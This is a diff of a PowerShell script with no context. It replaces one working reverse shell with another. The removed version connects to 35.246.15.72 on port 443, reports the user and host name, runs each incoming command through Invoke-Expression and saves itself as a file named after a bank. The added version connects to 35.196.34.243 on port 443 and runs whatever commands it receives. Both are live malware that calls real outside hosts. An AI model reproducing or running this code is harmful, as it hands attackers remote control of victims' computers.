@@ -1,55 +1,37 @@
-$a={
-$env:flag='1'
-if(Test-Path C:\Users\Public\Hapoalim.ps1){
-$flag='0'
-}
-if($flag -eq '1'){
-Start-Sleep -Seconds 10
-$client = New-Object System.Net.Sockets.TCPClient('35.246.15.72','443')
-$stream = $client.GetStream()
-[byte[]]$bytes = 0..65535|%{0}     
-$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
- $stream.Write($sendbytes,0,$sendbytes.Length)      
-$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
-$stream.Write($sendbytes,0,$sendbytes.Length)
-        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
-        {
-            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
-            $data = $EncodedText.GetString($bytes,0, $i)
-            try
-            {
-                
-                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
-            }
-            catch
-            {
-                
-                Write-Error $_
-            }
-            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
-            $x = ($error[0] | Out-String)
-            $error.clear()
-            $sendback2 = $sendback2 + $x
+$socket = new-object System.Net.Sockets.TcpClient('35.196.34.243', 443);
 
-            
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-            $stream.Write($sendbyte,0,$sendbyte.Length)
-            $stream.Flush()  
-        }
-        $client.Close()
-        if ($listener)
-        {
-            $listener.Stop()
-        }
-    
-    catch
-    {
-        
-        Write-Error $_
-    }
-    }
-    
+if($socket -eq $null){exit 1}
 
-    }
-    
-    Set-Content -Path C:\Users\Public\Hapoalim.ps1 -Value $a -ErrorAction SilentlyContinue
+$stream = $socket.GetStream();
+
+$writer = new-object System.IO.StreamWriter($stream);
+
+$buffer = new-object System.Byte[] 1024;
+
+$encoding = new-object System.Text.AsciiEncoding;
+
+do{
+
+	$writer.Write("> ");
+
+	$writer.Flush();
+
+	$read = $null;
+
+	while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}	
+
+	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+
+	if(!$out.equals("exit")){
+
+		$out = $out.split(' ')
+
+		$res = [string](&$out[0] $out[1..$out.length]);
+
+		if($res -ne $null){ $writer.WriteLine($res)}
+
+	}
+
+}While (!$out.equals("exit"))
+
+$writer.close();$socket.close();
